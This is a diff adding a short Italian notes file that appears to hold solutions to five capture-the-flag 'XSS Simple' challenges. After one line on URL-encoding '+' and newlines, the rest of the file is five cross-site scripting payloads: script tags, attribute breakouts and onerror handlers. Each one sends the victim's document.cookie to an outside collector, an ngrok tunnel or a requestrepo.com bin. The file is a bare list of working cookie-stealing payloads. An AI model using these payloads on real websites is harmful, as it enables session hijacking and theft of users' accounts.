@@ -1,0 +1,21 @@
+NOTA: Cambiare '+' con %2B quando viene passato a mano (e anche il newline ('\n') con %0A)
+
+
+XSS Simple 1 -- Payload:
+<script>location.href="https://c2ee-79-21-191-102.ngrok-free.app/?flag="%2Bdocument.cookie</script>
+
+
+XSS Simple 2 -- Payload:
+"><script>location.href="https://c2ee-79-21-191-102.ngrok-free.app/?flag="%2Bdocument.cookie</script>
+
+
+XSS Simple 3 -- Payload:
+" onerror="location.href='https://c2ee-79-21-191-102.ngrok-free.app/?flag='%2Bdocument.cookie "
+
+
+XSS Simple 4 -- Payload:
+<input type="image" src="" onerror="location.href='https://c2ee-79-21-191-102.ngrok-free.app/?flag='%2Bdocument.cookie ">
+
+
+XSS Simple 5 -- Payload:
+%0Alocation.href=`http://requestrepo.com/ku2i74nw/?flag=`%2Bdocument.cookie;//
